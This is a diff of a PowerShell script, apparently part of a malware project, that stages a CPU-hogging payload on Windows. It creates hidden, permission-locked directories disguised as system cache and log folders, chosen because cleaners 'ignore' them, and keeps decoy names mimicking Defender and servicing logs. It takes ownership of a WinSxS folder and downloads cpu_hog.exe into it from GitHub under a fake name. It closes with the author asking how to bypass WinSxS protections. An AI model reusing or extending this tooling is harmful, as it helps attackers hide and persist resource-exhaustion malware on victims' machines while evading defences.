@@ -118,40 +118,39 @@ while($true){
 
 # Last CPU_HOG Script on `mem_hog mod` commit
 
-$deepPaths=@(
-'C:\Windows\System32\LogFiles\WMI\RtBackup\',
-'C:\Windows\System32\Tasks_Migrated\',
-'C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\',
-'C:\Windows\System32\Microsoft\Crypto\Keys\',
-'C:\ProgramData\Microsoft\Windows\AppRepository\Packages\',
-'C:\Windows\System32\SMI\Store\Machine\',
-'C:\Windows\System32\DriverStore\Temp\',
-'C:\Windows\System32\com\appserver\',
-'C:\Windows\System32\Tasks\Microsoft\Windows\PLA\System\',
-'C:\Windows\System32\winevt\Logs\Archive\'
-)
-
 $payloadPaths = @(
-'C:\Windows\System32\Tasks\', 
-'C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\', 
-'C:\Windows\debug\WIA\', 
-'C:\Windows\Logs\CBS\', 
-'C:\PerfLogs\', 
-'C:\Windows\System32\spool\drivers\color\', 
-'C:\Windows\System32\com\dmp\', 
-'C:\Windows\System32\FxsTmp\', 
-'C:\Windows\ServiceState\',
-'C:\ProgramData\Microsoft\Windows\WER\ReportQueue\' 
+"C:\Windows\System32\LogFiles\WMI\RtBackup\Microsoft\Defender\Data\Scans\Historical",
+"C:\ProgramData\Microsoft\Windows\AppRepository\Packages\S-1-5-18\LocalState\Cache\Diagnostics",
+"C:\PerfLogs\Admin\System\Diagnostics\Logs\Archive\Debug",
+"C:\Intel\Logs\MEI\Debug\CrashDump\Reports\System",
+"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index",
+"C:\Windows\CSC\v2.0.6\namespace\HiddenStorage\Payloads",
+"C:\Users\Public\Documents\Shared Media\Cache\Updates\Binaries",
+"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE\Content.Temp\Cache",
+"C:\Windows\SoftwareDistribution\AuthCabs\Download\Unverified\Pending",
+"C:\Windows\Temp\Low\Scratch\IIS Config\Backup",
+"C:\`$WinREAgent\Logs\Backup\Updates\PayloadStore",
+"C:\Windows\LiveKernelReports\WATCHDOG\Dumps\Archived",
 )
+$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+# Creation and hardening script (run as admin):
+foreach ($path in $payloadPaths) {
+if (-not (Test-Path $path -PathType Container)) {
+New-Item -ItemType Directory -Path $path -Force | Out-Null
+attrib +s +h +r "$path"
+icacls "$path" /reset
+icacls "$path" /grant:r "$($user):(OI)(CI)F" "SYSTEM:(OI)(CI)F" /inheritance:d
+}
+}
+
 $payloadPaths = @(
 "C:\Windows\System32\Tasks\Microsoft\Windows\Diagnosis\Scheduled\Logs\Cache",
 "C:\ProgramData\Microsoft\Windows\AppRepository\StateRepository\Cache\Boot",
 "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\FontDrv\Metrics",
 "C:\Windows\InfusedApps\Packages\System\ShellExperience\Resources\LocalState\Indexed",
 "C:\Windows\Logs\CBS\PendingUpdates\Metadata\Backup",
-"C:\Program Files\Windows Defender\Platform\4.18\Configuration\Quarantine\History",
 "C:\Windows\System32\DriverStore\FileRepository\netrndis.inf_amd64_*\Temp\Wdf",
-"C:\Windows\WinSxS\Temp\PendingRenames\*_pending\ManifestCache",
+"C:\Windows\WinSxS\Temp\PendingRenames\Pending\ManifestCache",
 "C:\Windows\SoftwareDistribution\DataStore\Logs\Edb\Journal",
 "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\Caches\PreFetch",
 "C:\PerfLogs\Admin\Diagnostics\System\BootArchive",
@@ -163,7 +162,6 @@ $decoyNames = @(
     "DiagnosticCache",
     "StateRepositoryBackup",
     "FontMetricsTemp",
-    "ShellExperienceIndex",
     "CBSMetadataArchive",
     "DefenderQuarantineLog",
     "DriverStoreWdfTemp",
@@ -210,9 +208,28 @@ function Create-SneakPath{
 $customHell = Create-SneakPath -BasePath 'C:\Windows\System32\'
 $deepPaths+= $customHell#+Add+to+your+damn+array
 
-takeown /f "C:\Windows\WinSxS\Temp\PendingRenames" /r /d y
-icacls "C:\Windows\WinSxS\Temp\PendingRenames" /grant "$($env:USERNAME):(OI)(CI)F" /t /q
+takeown /f "C:\Windows\WinSxS\Temp\PendingRenames" /r /d y #don't use recursive /r or /t(for icacls) if you don't want access to sub-directories
+$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+icacls "C:\Windows\WinSxS\Temp\PendingRenames" /grant:r "$($user):(OI)(CI)F" "SYSTEM:(OI)(CI)F" /inheritance:d /t /q
 iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/cpu_hog.exe" -outfile "C:\Windows\WinSxS\Temp\PendingRenames\gg.exe" #for testing
+
+$c=-join ((48..57) + (97..122) | Get-Random -Count 17 | % { [char]$_ })
+$payloadPaths = @(
+"C:\Windows\System32\LogFiles\WMI\RtBackup\AutoRecover", # Default system logs—ignored by cleaners
+"C:\ProgramData\Microsoft\Windows\WER\ReportQueue\MemoryDumpShadow", # Crash report dump—nested and overlooked
+"C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\Hidden", # Font cache subdir—silent and deep
+"C:\Windows\Temp\MSI\LayeredDriverStore", # MSI installer debris—rarely purged
+"C:\Windows\System32\Com\dmp\SecureDumps", # COM debug dump—buried in system processes
+"C:\Windows\Resources\Themes\Cursors\Backup\PayloadStore", # Cursor theme backups—nobody checks
+"C:\ProgramData\Package Cache\ShadowCopy", # Installer cache—retained for rollbacks
+"C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\Legacy", # Task Scheduler legacy—persistent
+"C:\Windows\SoftwareDistribution\AuthCabs\Unverified", # Windows Update junk—ignored
+"C:\Windows\InfusedApps\Packages\Stable\CacheReserve", # AppX cache—system-protected
+"C:\Windows\System32\DriverStore\FileRepository\netrndis.inf_amd64_$c\Alternate", # Driver store—wildcard path (auto-rotates)
+"C:\Windows\Log\CBS\PendingOperations\Archive", # Component-Based Servicing logs—archived indefinitely
+"C:\PerfLogs\System\Diagnostics\Hidden", # Performance logs—low traffic
+"C:\Windows\System32\spool\drivers\color\Backup" # Printer driver backups—forgotten
+)
 
 # by default "C:\Windows\WinSxS" can't be accessed as admin, neither any files can be downloaded. how to bypass and download payloads there? I want specifically this path : C:\Windows\WinSxS\Temp\PendingRenames to download my payloads
 ### END
